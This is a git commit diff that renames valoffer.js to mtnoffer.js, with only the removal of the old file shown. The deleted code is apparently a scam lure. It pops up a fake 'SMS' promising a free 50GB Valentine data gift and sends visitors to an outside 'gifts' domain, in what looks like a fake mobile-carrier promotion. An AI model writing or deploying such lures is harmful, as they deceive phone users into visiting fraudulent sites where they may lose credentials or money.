5b3b7a54b1092135497e9c2bb5cb92a9f105993a
bigetijazz18 <bigetijazz18@gmail.com>
2025-02-15 07:13:21 +0100

    Update and rename valoffer.js to mtnoffer.js

--- valoffer.js
+++
@@ -1,6 +0,0 @@
-
-var password = 'CLAIM 50GB'
-password=prompt('SMS: Congratulations, you are all eligible for the 50GB Valentine data offer. Click OK to claim Data gift.','CLAIM 50GB');
-if (password != 'CLAIM 50GB') {
-location.href='https://www.year-25-gifts.xyz/mtnval';
-}
